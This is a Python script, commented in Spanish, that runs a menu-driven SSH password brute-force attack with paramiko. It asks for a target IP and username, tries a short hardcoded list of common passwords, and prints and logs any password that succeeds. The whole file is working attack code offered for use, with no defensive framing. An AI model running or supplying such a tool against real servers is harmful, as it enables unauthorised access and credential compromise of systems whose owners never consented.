import paramiko
import logging

# Configuración básica del logging para registrar las acciones
logging.basicConfig(filename='ssh_bruteforce.log', level=logging.INFO, 
                    format='%(asctime)s - %(levelname)s - %(message)s')

# Esta función realiza un ataque de fuerza bruta a un servidor SSH
def ssh_bruteforce(target_ip, username, password_list):
    ssh = paramiko.SSHClient()  # Crear un cliente SSH
    ssh.set_missing_host_key_policy(paramiko.AutoAddPolicy())  

    # Intentamos conectar con cada contraseña de la lista
    for password in password_list:
        try:
            ssh.connect(target_ip, username=username, password=password, timeout=5)  
            print(f"¡Contraseña encontrada!: {password}") 
            logging.info(f"Contraseña correcta encontrada: {password}")  
            return True  # Salir si se encuentra la contraseña
        except paramiko.AuthenticationException:
            # Si la autenticación falla, se continúa con la siguiente contraseña
            print(f"Contraseña fallida: {password}")  
            logging.warning(f"Autenticación fallida con la contraseña: {password}")  
        except paramiko.SSHException as ssh_exc:
            print(f"Error de SSH: {ssh_exc}")  
            logging.error(f"Error de SSH: {ssh_exc}")  
        except Exception as e:
            print(f"Error: {e}")  # Imprimir error genérico
            logging.error(f"Error durante la conexión: {e}")  
        finally:
            ssh.close()  

    print("No se encontró la contraseña correcta.")  
    logging.info("No se pudo encontrar una contraseña válida.")  
    return False

# Función para mostrar el menú principal
def show_menu():
    print("Bienvenido al menú principal:")
    print("1. Realizar ataque de fuerza bruta SSH")
    print("2. Salir")
    
    try:
        option = int(input("Selecciona una opción (1 o 2): "))  
        if option == 1:
            run_ssh_bruteforce()  
        elif option == 2:
            print("Saliendo...")  
            logging.info("El usuario salió del menú.")
        else:
            print("Opción no válida. Por favor, selecciona 1 o 2.")  
            logging.warning("El usuario seleccionó una opción no válida.")
    except ValueError:
        print("Por favor, ingresa un número válido.")  
        logging.error("El usuario ingresó un valor no numérico.")

# Esta función obtiene los datos del usuario y ejecuta el ataque de fuerza bruta
def run_ssh_bruteforce():
    target_ip = input("IP del servidor SSH: ") 
    username = input("Nombre de usuario: ")  
    
    # Validar que el nombre de usuario no esté vacío
    if not username:
        print("El nombre de usuario no puede estar vacío.")  
        logging.error("El nombre de usuario está vacío.")  
        return

    # Lista de contraseñas para probar (puedes agregar más o cargar desde un archivo)
    password_list = ["123456", "password", "admin"]  
    
    # Llamamos a la función de fuerza bruta con los datos del usuario
    ssh_bruteforce(target_ip, username, password_list)

if __name__ == "__main__":
    show_menu()  # Mostrar el menú principal al ejecutar el script
